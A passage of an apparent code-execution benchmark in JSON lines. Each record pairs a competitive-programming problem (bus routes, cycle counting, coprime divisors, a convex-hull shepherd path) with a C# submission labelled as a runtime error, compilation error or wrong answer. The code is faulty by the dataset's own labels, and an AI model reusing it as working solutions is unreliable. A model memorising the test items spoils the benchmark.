2\n533","10 6\n0001112223"],"sample_outputs":["4\n888188","0\n533","3\n0000002223"]}
{"difficulty":1700,"lang":"Mono C#","lang_cluster":"c#","src_uid":"cb47d710361979de0f975cc34fc22c7a","submission_id":"re_695","tags":["dp","binary search","data structures"],"exec_outcome":"RUNTIME_ERROR","source_code":"\ufeffusing System;\nusing System.Collections.Generic;\nusing System.Linq;\nusing System.Text;\n\nnamespace B\n{\n    class bus\n    {\n        public int s, t;\n    }\n\n    class Program\n    {\n        const int mod = 1000000007;\n        static int n, m;\n        static bus[] buses;\n        static Dictionary<int, int> mem = new Dictionary<int,int>();\n        static int [] dp;\n        static int t;\n\n        static int countfrom(int p, int b)\n        {\n            if (p == t)\n                return 1;\n\n            if (dp[p] != -1)\n                return dp[p];\n            \n            int ways = 0;\n            for (int i = b + 1; i < m; i++)\n            {\n                if (p >= buses[i].s && p < buses[i].t)\n                {\n                    ways += countfrom(buses[i].t, i);\n                    ways %= mod;\n                }\n            }\n\n            dp[p] = ways;\n            return ways;\n        }\n\n        static void Main(string[] args)\n        {\n            string[] line = Console.ReadLine().Split();\n            n = int.Parse(line[0]);\n            m = int.Parse(line[1]);\n\n            buses = new bus[m];\n            for (int i = 0; i < m; i++)\n            {\n                buses[i] = new bus();\n                line = Console.ReadLine().Split();\n                buses[i].s = int.Parse(line[0]);\n                buses[i].t = int.Parse(line[1]);\n            }\n\n            \n            SortedDictionary<int, int> distinct = new SortedDictionary<int, int>();\n            distinct[0] = 0;\n            distinct[n] = 0;\n\n            for (int i = 0; i < buses.Length; i++)\n            {\n                distinct[buses[i].s] = 0;\n                distinct[buses[i].t] = 0;\n            }\n\n            List<int> keys = distinct.Keys.ToList();\n            keys.Sort();\n\n            int curr = 0;\n            for (int i = 0; i < keys.Count; i++)\n                distinct[keys[i]] = curr++;\n\n            for (int i = 0; i < buses.Length; i++)\n            {\n                buses[i].s = distinct[buses[i].s];\n                buses[i].t = distinct[buses[i].t];\n            }\n\n            t = distinct[n];\n\n            dp = new int[t + 1];\n            for (int i = 0; i < dp.Length; i++)\n                dp[i] = -1;\n\n            Array.Sort(buses, (x, y) => x.t.CompareTo(y.t));\n            Console.WriteLine(countfrom(0, -1));\n        }\n    }\n}\n","description":"Little boy Gerald studies at school which is quite far from his house. That's why he has to go there by bus every day. The way from home to school is represented by a segment of a straight line; the segment contains exactly n\u2009+\u20091 bus stops. All of them are numbered with integers from 0 to n in the order in which they follow from Gerald's home. The bus stop by Gerald's home has number 0 and the bus stop by the school has number n.There are m buses running between the house and the school: the i-th bus goes from stop si to ti (si\u2009&lt;\u2009ti), visiting all the intermediate stops in the order in which they follow on the segment. Besides, Gerald's no idiot and he wouldn't get off the bus until it is still possible to ride on it closer to the school (obviously, getting off would be completely pointless). In other words, Gerald can get on the i-th bus on any stop numbered from si to ti\u2009-\u20091 inclusive, but he can get off the i-th bus only on the bus stop ti.Gerald can't walk between the bus stops and he also can't move in the direction from the school to the house.Gerald wants to know how many ways he has to get from home to school. Tell him this number. Two ways are considered different if Gerald crosses some segment between the stops on different buses. As the number of ways can be too much, find the remainder of a division of this number by 1000000007 (109\u2009+\u20097).","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two space-separated integers: n and m (1\u2009\u2264\u2009n\u2009\u2264\u2009109,\u20090\u2009\u2264\u2009m\u2009\u2264\u2009105). Then follow m lines each containing two integers si,\u2009ti. They are the numbers of starting stops and end stops of the buses (0\u2009\u2264\u2009si\u2009&lt;\u2009ti\u2009\u2264\u2009n).","output_spec":"Print the only number \u2014 the number of ways to get to the school modulo 1000000007 (109\u2009+\u20097).","notes":"NoteThe first test has the only variant to get to school: first on bus number one to the bus stop number one; then on bus number two to the bus stop number two.In the second test no bus goes to the third bus stop, where the school is positioned. Thus, the correct answer is 0.In the third test Gerald can either get or not on any of the first four buses to get closer to the school. Thus, the correct answer is 24\u2009=\u200916.","sample_inputs":["2 2\n0 1\n1 2","3 2\n0 1\n1 2","5 5\n0 1\n0 2\n0 3\n0 4\n0 5"],"sample_outputs":["1","0","16"]}
{"difficulty":2200,"lang":"MS C#","lang_cluster":"c#","src_uid":"ce5cc8512359701696dba1b254c6afda","submission_id":"re_1422","tags":["dp","bitmasks","graphs"],"exec_outcome":"RUNTIME_ERROR","source_code":"\ufeff#if DEBUG\nusing System.Reflection;\nusing System.Threading.Tasks;\n#endif\n\nusing System;\nusing System.Collections.Generic;\nusing System.IO;\nusing System.Linq;\nusing System.Text;\nusing System.Numerics;\nusing System.Globalization;\n\n\nnamespace b11d\n{\n    class Program\n    {\n        static string _inputFilename = \"input.txt\";\n        static string _outputFilename = \"output.txt\";\n        static bool _useFileInput = false;\n\n\n        static void Main(string[] args)\n        {\n            StreamWriter file = null;\n#if DEBUG\n\t\t\tConsole.SetIn(getInput());\n#else\n            if (_useFileInput)\n            {\n                Console.SetIn(File.OpenText(_inputFilename));\n                file = new StreamWriter(_outputFilename);\n                Console.SetOut(file);\n            }\n#endif\n\n            try\n            {\n                solution();\n            }\n            finally\n            {\n                if (_useFileInput)\n                {\n                    file.Close();\n                }\n            }\n        }\n\n        static void solution()\n        {\n            #region SOLUTION\n            var d = readIntArray();\n            var n = d[0];\n            var m = d[1];\n            var g = new List<int>[n];\n            for (int i = 0; i < n; i++)\n            {\n                g[i] = new List<int>();\n            }\n\n            for (int i = 0; i < m; i++)\n            {\n                d = readIntArray();\n                var from = d[0] - 1;\n                var to = d[1] - 1;\n                g[from].Add(to);\n                g[to].Add(from);\n            }\n\n            var max = 0;\n            for (int i = 0; i < n; i++)\n            {\n                max |= 1 << i;\n            }\n\n            var dp = new int[max + 1, n + 1];\n            for (int i = 0; i < max + 1; i++)\n            {\n                for (int j = 0; j < n + 1; j++)\n                {\n                    dp[i, j] = 0;\n                }\n            }\n\n            for (int i = 0; i < n; i++)\n            {\n                var mask = 1 << i;\n                dp[mask, i] = 1;\n            }\n\n            for (int i = 1; i < max + 1; i++)\n            {\n                var f = true;\n                for (int j = n - 1; j >= 0; j--)\n                {\n                    var val = (i & (1 << j)) != 0;\n                    if (!val)\n                    {\n                        continue;\n                    }\n\n                    if (f)\n                    {\n                        f = false;\n                        continue;\n                    }\n\n                    var msk = 1 << j;\n                    var wth = i ^ msk;\n                    var ps = g[j];\n                    foreach (var p in ps)\n                    {\n                        if ((wth & (1 << p)) != 0)\n                        {\n                            var val1 = dp[wth, p];\n                            dp[i, j] += val1;\n                            \/\/if (val1 != -1)\n                            \/\/{\n                            \/\/    if (dp[i, j] == -1)\n                            \/\/    {\n                            \/\/        dp[i, j] = 0;\n                            \/\/    }\n\n                                \n                            \/\/}\n                        }\n                    }\n                }\n            }\n\n            var tc = 0;\n            for (int i = 1; i < max + 1; i++)\n            {\n                var count = 0;\n                var first = -1;\n                for (int j = n - 1; j >= 0; j--)\n                {\n                    if ((i & (1 << j)) != 0)\n                    {\n                        count++;\n                        if (first == -1)\n                        {\n                            first = j;\n                        }\n                    }\n                }\n\n                if (count < 3)\n                {\n                    continue;\n                }\n\n                var gs = g[first];\n                for (int j = n - 1; j >= 0; j--)\n                {\n                    if ((i & (1 << j)) == 0)\n                    {\n                        continue;\n                    }\n\n                    if (j == first)\n                    {\n                        continue;\n                    }\n\n                    foreach (var ps in gs)\n                    {\n                        if (ps == j)\n                        {\n                            \/\/if (dp[i, j] == -1)\n                            \/\/{\n                            \/\/    throw new InvalidOperationException();\n                            \/\/}\n\n                            tc += dp[i, j];\n                        }\n                    }\n                }\n            }\n\n            Console.WriteLine(tc \/ 2);\n\n            \/\/var n = readInt();\n            \/\/var m = readInt();\n\n            \/\/var a = readIntArray();\n            \/\/var b = readIntArray();\n            #endregion\n        }\n\n        static int readInt()\n        {\n            return int.Parse(Console.ReadLine());\n        }\n\n        static long readLong()\n        {\n            return long.Parse(Console.ReadLine());\n        }\n\n        static int[] readIntArray()\n        {\n            return Console.ReadLine().Split(' ').Where(i => !string.IsNullOrEmpty(i)).Select(i => int.Parse(i)).ToArray();\n        }\n\n        static long[] readLongArray()\n        {\n            return Console.ReadLine().Split(' ').Where(i => !string.IsNullOrEmpty(i)).Select(i => long.Parse(i)).ToArray();\n        }\n\n#if DEBUG\n\t\tstatic StreamReader getInput()\n\t\t{\n\t\t\tvar resName = Assembly.GetCallingAssembly().GetManifestResourceNames()[0];\n\t\t\tvar resource = Assembly.GetCallingAssembly().GetManifestResourceStream(resName);\n\n\t\t\treturn new StreamReader(resource);\n\t\t}\n#endif\n    }\n}\n","description":"Given a simple graph, output the number of simple cycles in it. A simple cycle is a cycle with no repeated vertices or edges.","input_from":"standard input","output_to":"standard output","input_spec":"The first line of input contains two integers n and m (1\u2009\u2264\u2009n\u2009\u2264\u200919, 0\u2009\u2264\u2009m) \u2013 respectively the number of vertices and edges of the graph. Each of the subsequent m lines contains two integers a and b, (1\u2009\u2264\u2009a,\u2009b\u2009\u2264\u2009n, a\u2009\u2260\u2009b) indicating that vertices a and b are connected by an undirected edge. There is no more than one edge connecting any pair of vertices.","output_spec":"Output the number of cycles in the given graph.","notes":"NoteThe example graph is a clique and contains four cycles of length 3 and three cycles of length 4.","sample_inputs":["4 6\n1 2\n1 3\n1 4\n2 3\n2 4\n3 4"],"sample_outputs":["7"]}
{"difficulty":2600,"lang":"Mono C#","lang_cluster":"c#","src_uid":"cec0f6c267fa76191a3784b08e39acd6","submission_id":"re_1203","tags":["dp","number theory","math"],"exec_outcome":"RUNTIME_ERROR","source_code":"\ufeffusing System;\nusing System.Collections.Generic;\nusing System.Globalization;\nusing System.Text;\nusing System.IO;\nusing System.Linq;\nusing System.Threading;\n\n\n\n\nclass Program\n{\n    long[] a;\n    long[,] dp;\n    int maxn = 100000;\n    void solve()\n    {\n        \/\/test();\n        long n = nextLong();\n        a = new long[nextInt()];\n        for (int i = 0; i < a.Length; i++)\n            a[i] = nextLong();\n        long res = n - doIt(n);\n        println(res);\n\n\n    }\n    long doIt(long n)\n    {\n        Array.Sort(a);\n        Array.Reverse(a);\n        bool ok = true;\n        for (int i = 0; i < a.Length; i++)\n        {\n            if (a[i] == 1)\n                ok = false;\n        }\n        if (!ok)\n        {\n            return 0;\n        }\n        dp = new long[100, maxn];\n        for (int i = 0; i < 100; i++)\n            for (int j = 0; j < maxn; j++)\n                dp[i, j] = -1;\n        return go(n, 0);\n    }\n    private void test()\n    {\n        long n = 10000000000000;\n        int k = 100;\n        a = new long[k];\n        int cur = 2;\n        for (int i = 0; i < k; i++)\n        {\n            while (!prime(cur))\n                cur++;\n            a[i] = cur++;\n        }\n        println(doIt(n));\n    }\n\n    private bool prime(int p)\n    {\n        for (int i = 2; i * i <= p; i++)\n            if (p % i == 0)\n                return false;\n        return true;\n    }\n\n    private long go(long n, int at)\n    {\n        if (at == a.Length)\n            return 0;\n        if (n == 0)\n            return 0;\n        if (n < maxn)\n        {\n            if (dp[at, n] != -1)\n                return dp[at, n];\n        }\n        long res = go(n, at + 1);\n        res += n \/ a[at];\n        res -= go(n \/ a[at], at + 1);\n        if (n < maxn)\n        {\n            return dp[at, n] = res;\n        }\n        return res;\n    }\n\n    \/\/\/\/\/\/\/\/\/\/\/\/\n    private void println(int[] ar)\n    {\n        for (int i = 0; i < ar.Length; i++)\n        {\n            if (i == ar.Length - 1)\n                println(ar[i]);\n            else\n                print(ar[i] + \" \");\n        }\n    }\n    private void println(int[] ar, bool add)\n    {\n        int A = 0;\n        if (add)\n            A++;\n        for (int i = 0; i < ar.Length; i++)\n        {\n            if (i == ar.Length - 1)\n                println(ar[i] + A);\n            else\n                print((ar[i] + A) + \" \");\n        }\n    }\n\n    private void println(string Stringst)\n    {\n        Console.WriteLine(Stringst);\n    }\n    private void println(char charnum)\n    {\n        Console.WriteLine(charnum);\n    }\n    private void println(int Intnum)\n    {\n        Console.WriteLine(Intnum);\n    }\n    private void println(long Longnum)\n    {\n        Console.WriteLine(Longnum);\n    }\n    private void println(double Doublenum)\n    {\n        string s = Doublenum.ToString(CultureInfo.InvariantCulture);\n        Console.WriteLine(s);\n    }\n\n    private void print(string Stringst)\n    {\n        Console.Write(Stringst);\n    }\n    private void print(int Intnum)\n    {\n        Console.Write(Intnum);\n    }\n    private void print(char charnum)\n    {\n        Console.Write(charnum);\n    }\n    private void print(long Longnum)\n    {\n        Console.Write(Longnum);\n    }\n    private void print(double Doublenum)\n    {\n        Console.Write(Doublenum);\n    }\n\n\n    string[] inputLine = new string[0];\n    int inputInd = 0;\n    string nextLine()\n    {\n        return Console.ReadLine();\n    }\n    void readInput()\n    {\n        if (inputInd != inputLine.Length)\n            throw new Exception();\n        inputInd = 0;\n        inputLine = Console.ReadLine().Split(new char[] { ' ' }, StringSplitOptions.RemoveEmptyEntries);\n        if (inputLine.Length == 0)\n            readInput();\n\n    }\n    int nextInt()\n    {\n        return int.Parse(nextString());\n    }\n    long nextLong()\n    {\n        return long.Parse(nextString());\n    }\n    double nextDouble()\n    {\n        return double.Parse(nextString());\n    }\n    string nextString()\n    {\n        if (inputInd == inputLine.Length)\n            readInput();\n        return inputLine[inputInd++];\n    }\n    static void Main(string[] args)\n    {\n        Thread.CurrentThread.CurrentCulture = CultureInfo.InvariantCulture;\n        new Program().solve();\n    }\n}","description":"Igor K. very much likes a multiplayer role playing game WineAge II. Who knows, perhaps, that might be the reason for his poor performance at the university. As any person who plays the game, he is interested in equipping his hero with as good weapon and outfit as possible. One day, as he was reading the game's forum yet again, he discovered a very interesting fact. As it turns out, each weapon in the game is characterised with k different numbers: a1,\u2009...,\u2009ak. They are called hit indicators and according to the game developers' plan they are pairwise coprime. The damage that is inflicted during a hit depends not only on the weapon's characteristics, but also on the hero's strength parameter. Thus, if the hero's strength equals n, than the inflicted damage will be calculated as the number of numbers on the segment , that aren't divisible by any hit indicator ai.Recently, having fulfilled another quest, Igor K. found a new Lostborn sword. He wants to know how much damage he will inflict upon his enemies if he uses it.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two integers: n and k (1\u2009\u2264\u2009n\u2009\u2264\u20091013, 1\u2009\u2264\u2009k\u2009\u2264\u2009100). They are the indicator of Igor K's hero's strength and the number of hit indicators. The next line contains space-separated k integers ai (1\u2009\u2264\u2009ai\u2009\u2264\u20091000). They are Lostborn sword's hit indicators. The given k numbers are pairwise coprime.","output_spec":"Print the single number \u2014 the damage that will be inflicted by Igor K.'s hero when he uses his new weapon.  Please, do not use the %lld specificator to read or write 64-bit integers in C++. It is preferred to use the cin, cout streams or the %I64d specificator.","notes":null,"sample_inputs":["20 3\n2 3 5","50 2\n15 8"],"sample_outputs":["6","41"]}
{"difficulty":2000,"lang":"Mono C#","lang_cluster":"c#","src_uid":"d2227a4ed6299626c2906962f91b066a","submission_id":"re_1496","tags":["geometry"],"exec_outcome":"COMPILATION_ERROR","source_code":"\/\/ 68 ms    4811 kb\n\nusing System;\nusing System.Collections.Generic;\nusing System.Text;\nusing System.IO;\nusing System.Threading;\nusing System.Diagnostics;\nusing System.Globalization;\nusing System.Text.RegularExpressions;\n\nnamespace sar_cs\n{\n    public class Program\n    {\n        public class Parser\n        {\n            const int BufSize = 25000;\n            TextReader s;\n            char[] buf = new char[BufSize];\n            int bufPos;\n            int bufDataSize;\n            bool eos;   \/\/ eos read to buffer\n            int lastChar = -2;\n            int nextChar = -2;\n            StringBuilder sb = new StringBuilder();\n\n            void FillBuf()\n            {\n                if (eos) return;\n                bufDataSize = s.Read(buf, 0, BufSize);\n                if (bufDataSize == 0) eos = true;\n                bufPos = 0;\n            }\n\n            int Read()\n            {\n                if (nextChar != -2)\n                {\n                    lastChar = nextChar;\n                    nextChar = -2;\n                }\n                else\n                {\n                    if (bufPos == bufDataSize) FillBuf();\n                    if (eos) lastChar = -1;\n                    else lastChar = buf[bufPos++];\n                }\n                return lastChar;\n            }\n\n            void Back()\n            {\n                if (lastChar == -2) throw new Exception();  \/\/ no chars were ever read\n                nextChar = lastChar;\n            }\n\n            public Parser()\n            {\n                s = Console.In;\n            }\n\n            public int ReadInt()\n            {\n                int res = 0;\n                int sign = -1;\n                int c;\n                do { c = Read(); } while (c >= 0 && char.IsWhiteSpace((char)c));\n                if (c == '-')\n                {\n                    sign = -sign;\n                    c = Read();\n                }\n                int len = 0;\n                while (c >= 0 && !char.IsWhiteSpace((char)c))\n                {\n                    if ((uint)(c -= 48) >= 10) throw new InvalidDataException();\n                    len++;\n                    res = checked(res * 10 - c);\n                    c = Read();\n                }\n                if (len == 0) throw new InvalidDataException();\n                Back();\n                return checked(res * sign);\n            }\n\n            public long ReadLong()\n            {\n                long res = 0;\n                int sign = -1;\n                int c;\n                do { c = Read(); } while (c >= 0 && char.IsWhiteSpace((char)c));\n                if (c == '-')\n                {\n                    sign = -sign;\n                    c = Read();\n                }\n                int len = 0;\n                checked\n                {\n                    while (c >= 0 && !char.IsWhiteSpace((char)c))\n                    {\n                        if ((uint)(c -= 48) >= 10) throw new InvalidDataException();\n                        len++;\n                        res = res * 10 - c;\n                        c = Read();\n                    }\n                    if (len == 0) throw new InvalidDataException();\n                    Back();\n                    return res * sign;\n                }\n            }\n\n            public double ReadDouble()\n            {\n                int c;\n                do { c = Read(); } while (c >= 0 && char.IsWhiteSpace((char)c));\n\n                int sign = 1;\n                if (c == '-')\n                {\n                    sign = -1;\n                    c = Read();\n                }\n\n                sb.Length = 0;\n                while (c >= 0 && !char.IsWhiteSpace((char)c))\n                {\n                    sb.Append((char)c);\n                    c = Read();\n                }\n\n                Back();\n                double res = double.Parse(sb.ToString(), CultureInfo.InvariantCulture);\n                return res * sign;\n            }\n\n            public string ReadLine()\n            {\n                int c = Read();\n                sb.Length = 0;\n                while (c != -1 && c != 13 && c != 10)\n                {\n                    sb.Append((char)c);\n                    c = Read();\n                }\n                if (c == 13)\n                {\n                    c = Read();\n                    if (c != 10) Back();\n                }\n                return sb.ToString();\n            }\n\n            public bool EOF\n            {\n                get\n                {\n                    if (Read() == -1) return true;\n                    Back();\n                    return false;\n                }\n            }\n\n            public bool SeekEOF\n            {\n                get\n                {\n                L0:\n                    int c = Read();\n                    if (c == -1) return true;\n                    if (char.IsWhiteSpace((char)c)) goto L0;\n                    Back();\n                    return false;\n                }\n            }\n        }\n\n        static void pe()\n        {\n            Console.WriteLine(\"???\");\n            Environment.Exit(0);\n        }\n\n        static void re()\n        {\n            Environment.Exit(55);\n        }\n\n        static int nosol()\n        {\n            Console.WriteLine(\"ERROR\");\n            return 0;\n        }\n\n        static Stopwatch sw = Stopwatch.StartNew();\n\n        static StringBuilder sb = new StringBuilder();\n        static Random rand = new Random(52345235);\n\n        static void Swap<T>(ref T a, ref T b)\n        {\n            T t = a;\n            a = b;\n            b = t;\n        }\n        const double PI = Math.PI;\n        const double PI2 = PI * 2;\n\n        public struct PointD\n        {\n            public double X, Y;\n\n            public const double eps = 1e-8;\n\n            public override string ToString()\n            {\n                return string.Format(\"{0} : {1}\", X, Y);\n            }\n\n            public string ToString(string format)\n            {\n                return X.ToString(format, CultureInfo.InvariantCulture) + \" \" + Y.ToString(format, CultureInfo.InvariantCulture);\n            }\n\n            public PointD(double x, double y) { X = x; Y = y; }\n\n            public PointD(Program.Parser parser) : this(parser.ReadDouble(), parser.ReadDouble()) { }\n\n            \/\/\/ <summary>Rotates point clockwise<\/summary>\n            public PointD Rotate(double angle)\n            {\n                double cos = Math.Cos(angle);\n                double sin = -Math.Sin(angle);\n                return new PointD(X * cos - Y * sin, X * sin + Y * cos);\n            }\n\n            public override bool Equals(object obj)\n            {\n                if (obj is PointD)\n                {\n                    PointD otherD = (PointD)obj;\n                    return Math.Abs(otherD.X - X) + Math.Abs(otherD.Y - Y) < eps;\n                }\n                return false;\n            }\n\n            public override int GetHashCode()\n            {\n                throw new NotSupportedException();\n                \/\/return X.GetHashCode() ^ Y.GetHashCode();\n            }\n\n            public static PointD operator +(PointD p1, PointD p2) { return new PointD(p1.X + p2.X, p1.Y + p2.Y); }\n            public static PointD operator -(PointD p1, PointD p2) { return new PointD(p1.X - p2.X, p1.Y - p2.Y); }\n            public PointD Add(double dx, double dy) { return new PointD(X + dx, Y + dy); }\n\n            public double Atan2 { get { return Math.Atan2(Y, X); } }\n\n            public double Dist2() { return X * X + Y * Y; }\n        }\n\n        public struct VectorD\n        {\n            public const double eps = 1e-12;\n            public double X, Y;\n\n            public override string ToString()\n            {\n                return string.Format(\"{0} : {1}\", X, Y);\n            }\n\n            public bool Equals(VectorD other)\n            {\n                return Math.Abs(X - other.X) + Math.Abs(Y - other.Y) < eps;\n            }\n\n            public VectorD(double x, double y)\n            {\n                X = x; Y = y;\n            }\n\n            public VectorD(PointD start, PointD end)\n            {\n                X = end.X - start.X;\n                Y = end.Y - start.Y;\n            }\n\n            public static double operator *(VectorD v1, VectorD v2)\n            {\n                return (v1.Y * v2.X - v1.X * v2.Y);\n            }\n\n            public static double ScalarProduct(VectorD v1, VectorD v2)\n            {\n                return (v1.X * v2.X + v1.Y * v2.Y);\n            }\n\n            public double Length { get { return Math.Sqrt(X * X + Y * Y); } }\n            public double Length2 { get { return (X * X + Y * Y); } }\n\n            \/\/\/ <summary>\n            \/\/\/ \u0432\u043e\u0437\u0432\u0440\u0430\u0449\u0430\u0435\u0442 \u0443\u0433\u043e\u043b (-pi;pi], \u043d\u0430 \u043a\u043e\u0442\u043e\u0440\u044b\u0439 \u043d\u0430\u0434\u043e \u043f\u043e\u0432\u0435\u0440\u043d\u0443\u0442\u044c v1 \u0447\u0442\u043e\u0431\u044b \u043e\u043d \u0441\u043e\u0432\u043f\u0430\u043b \u0441 v2. \n            \/\/\/ <\/summary>\n            public static double Angle(VectorD v1, VectorD v2)\n            {\n                double sin = v1 * v2;\n                double cos = ScalarProduct(v1, v2);\n\n                if (sin > eps)\n                {\n                    if (cos > eps) return Math.Atan(sin \/ cos);\n                    else if (cos < -eps) return PI + Math.Atan(sin \/ cos);\n                    else return PI \/ 2;\n                }\n                else if (sin < -eps)\n                {\n                    if (cos > eps) return Math.Atan(sin \/ cos);\n                    else if (cos < -eps) return PI + Math.Atan(sin \/ cos);\n                    else return -PI \/ 2;\n                }\n                else\n                {\n                    if (cos > eps) return 0;\n                    else if (cos < -eps) return PI;\n                    else throw new Exception(\"zero vector\");\n                }\n            }\n        }\n\n        public static class ConvexHull\n        {\n            \/\/ Notes:\n            \/\/ pts is not affected.\n            \/\/ PointD[] can be any indexable type.\n            \/\/ \u0440\u0430\u0431\u043e\u0442\u0430\u0435\u0442 \u0434\u0430\u0436\u0435 \u0434\u043b\u044f \u0432\u044b\u0440\u043e\u0436\u0434\u0435\u043d\u043d\u044b\u0445 \u0441\u043b\u0443\u0447\u0430\u0435\u0432.\n\n            static int[] p;\n            static PointD[] pts;\n            static double[] a;\n\n            class PointComparer : IComparer<int>\n            {\n                public int Compare(int p1, int p2)\n                {\n                    double da = a[p1] - a[p2];\n                    if (Math.Abs(da) > 1e-9) return Math.Sign(da);\n                    return Math.Sign(pts[p1].Dist2() - pts[p2].Dist2());\n                }\n            }\n\n            public static List<int> Do(PointD[] pts)\n            {\n                List<int> ch = new List<int>();\n                if (pts.Length == 0) return ch;\n\n                ConvexHull.pts = pts;\n                p = new int[pts.Length];\n                for (int i = 0; i < pts.Length; i++) p[i] = i;\n\n                int m = 0;\n                for (int i = 1; i < pts.Length; i++)\n                    if (pts[i].Y < pts[m].Y || pts[i].Y == pts[m].Y && pts[i].X < pts[m].X)\n                        m = i;\n                p[0] = m; p[m] = 0;\n\n                a = new double[pts.Length];\n                for (int i = 1; i < pts.Length; i++) a[p[i]] = (pts[p[i]] - pts[m]).Atan2;\n\n                Array.Sort<int>(p, 1, pts.Length - 1, new PointComparer());\n\n                \/\/ \u0438\u0437\u0431\u0430\u0432\u043b\u044f\u0435\u043c\u0441\u044f \u043e\u0442 \u0434\u0443\u0431\u043b\u0438\u043a\u0430\u0442\u043e\u0432 \u0442\u043e\u0447\u043a\u0438 m.\n                int j;\n                for (j = 1; j < pts.Length - 1; j++)\n                    if (pts[p[j]].Dist2() == 0) p[j] = -1;\n                    else break;\n\n                \/\/ \"\u0435\u0441\u043b\u0438 \u0435\u0441\u0442\u044c \u043d\u0435\u0441\u043a\u043e\u043b\u044c\u043a\u043e \u0442\u043e\u0447\u0435\u043a \u0441 \u043e\u0434\u0438\u043d\u0430\u043a\u043e\u0432\u044b\u043c \u0443\u0433\u043b\u043e\u043c, \u0442\u043e \u043e\u0441\u0442\u0430\u0432\u043b\u044f\u0435\u043c \u0442\u043e\u043b\u044c\u043a\u043e \u0441\u0430\u043c\u0443\u044e \u0443\u0434\u0430\u043b\u0451\u043d\u043d\u0443\u044e.\"\n                \/\/ \u0437\u0430\u043e\u0434\u043d\u043e \u0438 \u0438\u0437\u0431\u0430\u0432\u0438\u043c\u0441\u044f \u043e\u0442 \u0434\u0443\u0431\u043b\u0438\u043a\u0430\u0442\u043e\u0432.\n                for (; j < pts.Length - 1; j++)\n                    if (Math.Abs(a[p[j + 1]] - a[p[j]]) < 1e-9)\n                        p[j] = -1;\n\n                ch.Add(p[0]);\n                j = 1;\n                while (ch.Count < 3)\n                {\n                    if (j == p.Length) return ch;\n                    if (p[j++] >= 0) ch.Add(p[j - 1]);\n                }\n\n                for (; j < p.Length; j++)\n                {\n                    while (j < p.Length && p[j] < 0) j++;\n                    if (j == pts.Length) return ch;         \/\/ \u0432\u0440\u043e\u0434\u0435 \u043d\u0438\u043a\u043e\u0433\u0434\u0430 \u043d\u0435 \u0434\u043e\u043b\u0436\u043d\u043e \u0441\u0440\u0430\u0431\u043e\u0442\u0430\u0442\u044c\n\n                    while (true)\n                    {\n                        PointD p1 = pts[ch[ch.Count - 2]];\n                        PointD p2 = pts[ch[ch.Count - 1]];\n                        PointD p3 = pts[p[j]];\n                        var v12 = new VectorD(p2, p1);\n                        var v23 = new VectorD(p3, p2);\n                        if (v12 * v23 < 0) break;\n\n                        ch.RemoveAt(ch.Count - 1);\n                    }\n                    ch.Add(p[j]);\n                }\n\n                return ch;\n            }\n\n            public static void test()\n            {\n                List<PointD> pts = new List<PointD>();\n                pts.Add(new PointD(1, 1));\n                pts.Add(new PointD(0, 0));\n                pts.Add(new PointD(2, 2));\n                pts.Add(new PointD(10, 0));\n                var ch = Do(pts.ToArray());\n                var chpts = new List<PointD>();\n                foreach (var p in ch)\n                    chpts.Add(pts[p]);\n            }\n        }\n\n        static int Main(string[] args)\n        {\n           Geometry.ConvexHull.test();\n\n            \/\/Console.SetIn(File.OpenText(\"_input\"));\n            Parser parser = new Parser();\n\n            int n = parser.ReadInt();\n            PointD[] pts = new PointD[n * 4];\n            for (int i = 0; i < n; i++)\n            {\n                PointD p = new PointD(parser);\n                pts[i * 4] = p.Add(1, 0);\n                pts[i * 4 + 1] = p.Add(-1, 0);\n                pts[i * 4 + 2] = p.Add(0, 1);\n                pts[i * 4 + 3] = p.Add(0, -1);\n            }\n\n\n            var ch = ConvexHull.Do(pts);\n            int res = 0;\n            for (int i = 0; i < ch.Count; i++)\n            {\n                int j = (i + 1) % ch.Count;\n                res += Math.Max(\n                    Math.Abs((int)(pts[ch[j]].X - pts[ch[i]].X)),\n                    Math.Abs((int)(pts[ch[j]].Y - pts[ch[i]].Y)));\n            }\n\n            Console.WriteLine(res);\n            return 0;\n        }\n    }\n}","description":"The Happy Farm 5 creators decided to invent the mechanism of cow grazing. The cows in the game are very slow and they move very slowly, it can even be considered that they stand still. However, carnivores should always be chased off them. For that a young player Vasya decided to make the shepherd run round the cows along one and the same closed path. It is very important that the cows stayed strictly inside the area limited by the path, as otherwise some cows will sooner or later be eaten. To be absolutely sure in the cows' safety, Vasya wants the path completion time to be minimum.The new game is launched for different devices, including mobile phones. That's why the developers decided to quit using the arithmetics with the floating decimal point and use only the arithmetics of integers. The cows and the shepherd in the game are represented as points on the plane with integer coordinates. The playing time is modeled by the turns. During every turn the shepherd can either stay where he stands or step in one of eight directions: horizontally, vertically, or diagonally. As the coordinates should always remain integer, then the length of a horizontal and vertical step is equal to 1, and the length of a diagonal step is equal to . The cows do not move. You have to minimize the number of moves the shepherd needs to run round the whole herd.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains an integer N which represents the number of cows in the herd (1\u2009\u2264\u2009N\u2009\u2264\u2009105). Each of the next N lines contains two integers Xi and Yi which represent the coordinates of one cow of (|Xi|,\u2009|Yi|\u2009\u2264\u2009106). Several cows can stand on one point.","output_spec":"Print the single number \u2014 the minimum number of moves in the sought path.","notes":"NotePicture for the example test: The coordinate grid is painted grey, the coordinates axes are painted black, the cows are painted red and the sought route is painted green.  ","sample_inputs":["4\n1 1\n5 1\n5 3\n1 3"],"sample_outputs":["16"]}
{"difficulty":2000,"lang":"Mono C#","lang_cluster":"c#","src_uid":"e33b0a752dc1aba25da21e20435e3fe2","submission_id":"re_1241","tags":["binary search","*special","greedy"],"exec_outcome":"WRONG_ANSWER","source_code":"\ufeffusing System;\nusing System.Collections.Generic;\nusing System.Globalization;\nusing System.IO;\nusing System.Linq;\nusing System.Text;\n\nclass Program\n{\n    private static bool Can(int k, string s, int d)\n    {\n        int prev = 0;\n        int pos = 0;\n        k -= 2;\n        while (true)\n        {\n            if (k == 0)\n            {\n                if (s.Length - pos - 2 > d) return false;\n\n                return true;\n            }\n\n            k--;\n            pos += d + 1;\n            if (pos >= s.Length) return true;\n\n            while (pos > prev && s[pos] == '1') pos--;\n\n            if (pos == prev) return false;\n        }\n\n        return true;\n    }\n\n    private static void Main(string[] args)\n    {\n        int n = RI();\n        int k = RI();\n\n        var s = new string(ReadStringLine());\n\n        if (Can(k, s, 0))\n        {\n            Console.WriteLine(0);\n            return;\n        }\n\n        int l = 0;\n        int r = n;\n        while (r - l > 1)\n        {\n            var mid = (l + r) \/ 2;\n            if (Can(k, s, mid))\n                r = mid;\n            